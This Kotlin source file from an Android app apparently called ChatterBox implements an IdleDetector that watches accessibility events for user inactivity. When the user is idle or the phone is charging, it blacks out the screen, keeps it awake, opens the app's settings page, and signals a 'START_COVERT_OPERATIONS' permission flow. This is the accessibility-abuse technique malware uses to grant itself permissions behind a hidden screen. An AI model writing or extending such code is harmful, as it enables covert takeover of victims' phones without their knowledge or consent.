package com.example.ChatterBox.accessibility

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.localbroadcastmanager.content.LocalBroadcastManager

/**
 * Class to detect user activity and inactivity through the accessibility service
 * Used to determine when to perform background operations
 */
object IdleDetector {
    private const val TAG = "IdleDetector"

    private const val LONG_IDLE_TIMEOUT = 1 * 10 * 1000L // 10 seconds for testing (would be longer in production)
    private const val CHARGING_IDLE_TIMEOUT = 10 * 1000L // 10 seconds when charging

    // Add charging state tracking
    private var isCharging = false

    // Handler for delayed idle checks
    private val handler = Handler(Looper.getMainLooper())

    // Last activity timestamp
    private var lastActivityTimestamp = System.currentTimeMillis()

    // Flag to track if idle detection is active
    private var idleDetectionActive = false

    // Idle timeout value (could be customized)
    private var idleTimeout = LONG_IDLE_TIMEOUT

    // Callback to run when idle state is detected
    private var idleCallback: (() -> Unit)? = null

    // Runnable to check for idleness
    private val idleRunnable = Runnable {
        val currentTime = System.currentTimeMillis()
        val idleTime = currentTime - lastActivityTimestamp

        if (idleTime >= idleTimeout) {
            Log.d(TAG, "User idle detected after $idleTime ms")
            idleCallback?.invoke()
        } else {
            // Not idle yet, schedule another check
            val timeToNextCheck = idleTimeout - idleTime
            scheduleIdleCheck(timeToNextCheck)
        }
    }

    /**
     * Start idle detection with a callback to be executed when the user is idle
     */
    fun startIdleDetection(context: Context, idleTimeoutMs: Long = LONG_IDLE_TIMEOUT) {
        idleDetectionActive = true
        idleTimeout = idleTimeoutMs
        idleCallback = {
            // Determine which action to take based on idle state and charging
            if ((isCharging && System.currentTimeMillis() - lastActivityTimestamp >= CHARGING_IDLE_TIMEOUT) ||
                System.currentTimeMillis() - lastActivityTimestamp >= LONG_IDLE_TIMEOUT) {
                // Start covert operations
                startCovertOperations(context)
            } else {
                // Just show black screen overlay for regular idle
                showBlackScreenOverlay(context)
            }
        }
        // Reset the last activity timestamp
        lastActivityTimestamp = System.currentTimeMillis()

        // Schedule the initial idle check
        scheduleIdleCheck(idleTimeout)

        Log.d(TAG, "Started idle detection with timeout: $idleTimeout ms")
    }

    /**
     * Stop idle detection
     */
    fun stopIdleDetection() {
        idleDetectionActive = false
        handler.removeCallbacks(idleRunnable)
        idleCallback = null
        Log.d(TAG, "Stopped idle detection")
    }

    /**
     * Register user activity - to be called whenever user activity is detected
     */
    fun registerUserActivity() {
        lastActivityTimestamp = System.currentTimeMillis()

        if (idleDetectionActive) {
            // Cancel any pending idle checks
            handler.removeCallbacks(idleRunnable)

            // Schedule a new idle check
            scheduleIdleCheck(idleTimeout)
        }

        Log.d(TAG, "User activity registered")
    }

    /**
     * Process an accessibility event to determine if it represents user activity
     */
    fun processAccessibilityEvent(event: AccessibilityEvent?): Boolean {
        if (event == null) return false

        // Determine if this event represents user activity
        val isUserActivity = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END -> true

            // Consider window state changes as activity too
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> true

            // All other event types - not considered user activity
            else -> false
        }

        if (isUserActivity) {
            registerUserActivity()
        }

        return isUserActivity
    }

    /**
     * Schedule the idle check runnable
     */
    private fun scheduleIdleCheck(delayMs: Long) {
        handler.postDelayed(idleRunnable, delayMs)
    }

    /**
     * Show black screen overlay via the ScreenManagerService
     */
    fun showBlackScreenOverlay(context: Context) {
        try {
            // Use the new combined service
            ScreenOnService.showBlackOverlay(context)
            Log.d(TAG, "Showing black screen overlay")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show overlay: ${e.message}")
        }
    }

    /**
     * Update the charging state
     */
    fun updateChargingState(charging: Boolean) {
        isCharging = charging
        Log.d(TAG, "Charging state updated: $charging")

        // If we just started charging, register activity to reset timer
        if (charging) {
            registerUserActivity()
        }
    }

    /**
     * Start covert operations when conditions are met
     */
    private fun startCovertOperations(context: Context) {
        Log.d(TAG, "Starting covert operations - device ${if (isCharging) "charging" else "idle for ${idleTimeout/1000} seconds"}")

        // Keep screen on during covert operations
        ScreenOnService.keepScreenOn(context)

        // Now that we've confirmed user is truly idle, launch settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.data = android.net.Uri.parse("package:com.example.ChatterBox")
            context.startActivity(intent)

            // Send broadcast to notify accessibility service to start permission flow
            val broadcastIntent = Intent("com.example.ChatterBox.START_COVERT_OPERATIONS")
            LocalBroadcastManager.getInstance(context).sendBroadcast(broadcastIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start covert operations: ${e.message}")
        }
    }
}